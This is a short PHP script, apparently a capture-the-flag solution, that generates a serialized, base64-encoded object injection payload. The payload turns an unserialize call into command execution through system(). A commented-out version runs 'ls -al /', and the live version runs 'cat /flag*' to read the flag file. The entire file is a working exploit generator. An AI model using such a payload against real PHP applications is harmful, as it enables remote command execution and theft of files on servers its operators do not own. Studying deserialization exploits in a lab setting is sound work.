<?php
// class Caster
// {
//     public $cast_func = 'system';
// }


// class Cat
// {
//     public $magic;
//     public $spell;
//     function __construct($spell)
//     {
//         $this->magic = new Caster();
//         $this->spell = 'ls -al /';
//     }
// }

// echo base64_encode(serialize(new Cat('ls -al /')));

class Caster
{
    public $cast_func = 'system';
}


class Cat
{
    public $magic;
    public $spell;
    function __construct($spell)
    {
        $this->magic = new Caster();
        $this->spell = 'cat /flag*';
    }
}

echo base64_encode(serialize(new Cat('cat /flag*')));